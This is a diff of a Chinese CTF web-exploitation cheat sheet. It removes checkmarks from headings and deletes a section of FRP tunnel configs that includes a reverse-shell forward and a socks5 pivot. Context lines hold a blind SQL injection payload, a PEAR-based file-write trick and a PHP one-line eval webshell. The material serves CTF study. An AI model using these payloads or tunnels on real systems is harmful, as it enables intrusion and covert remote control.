@@ -18,7 +18,7 @@ tags: ['CTF', 'WEB', '知识总结']
 ```
 
 # 命令执行
-## LINUX√
+## LINUX
 ### LINUX 命令执行
 ```plain
 # 符号概念
@@ -2157,7 +2157,7 @@ payload :?id=1'AND IF(LENGTH((SELECT DATABASE()))>9,SLEEP(5),1)--+
 # 以上方法均不行时进行条件竞争
 ```
 
-# 文件包含√
+# 文件包含
 ## 文件包含 常用包含函数 和 伪协议
 ```plain
 # 只要文件能被包含以及被读取，即可执行文件包含
@@ -2665,7 +2665,7 @@ pear config-creat /tmp/hello.php <?=phpinfo()?> /tmp/hello.php
 ?+config-create+/<?=phpinfo()?>+/var/www/html/shell 
 ```
 
-# 文件上传√
+# 文件上传
 ## 文件上传 一句话木马
 ```plain
 <?php @eval($_POST['pass']);?> #php @表示执行错误也不报错
@@ -5830,58 +5830,3 @@ linux 命令会优先在此路径中查找（当然也可以自己 export 一个
 ## 提权 补充 文件权限组
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1722508374131-a8106863-6509-4891-95fd-d7a1736569d8.png)
-
-# 内网横向
-## FRP 的配置与使用
-简单使用的话只需要修改配置，在攻击端使用 frpc，客户端使用 frps
-
-```plain
-[common]
-bind_port = 7000        #frps服务端的端口
-token = 12345678        #客户端连接服务端的密码
-dashboard_port = 7500   #控制面板的服务端口
-dashboard_user = admin  #控制面板登录账户
-dashboard_pwd = admin   #控制面板登录密码
-```
-
-```plain
-[common]
-server_addr = 1.1.1.1   #frp服务端的IP
-server_port = 7000      #frps服务端的端口         
-token = 12345678        #连接frp服务端的密码
-
-[http_proxyx]
-type = tcp              #通信数据类型
-remote_port = 1080      #在frp服务端开设代理服务的端口
-plugin = socks5         #通过插件开设socks5代理服务
-#plugin_user = abc123   #通过插件设置连接代理的用户名               
-#plugin_passwd = abc123 #通过插件设置连接代理的密码
-#user_compression=true  
-```
-
-自用的 FRP 配置
-
-```plain
-serverAddr = "192.168.100.128"
-serverPort = 7000
-
-[[proxies]]
-name = "shell"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 5555
-remotePort = 5555
-
-# name = "ssh"
-# type = "tcp"
-# localIP = "127.0.0.1"
-# localPort = 22
-# remotePort = 6000
-
-# name = "web"
-# type = "http"
-# localPort = 80
-# customDomains = ["localhost"]
-```
-
-# 应急响应（待补充）
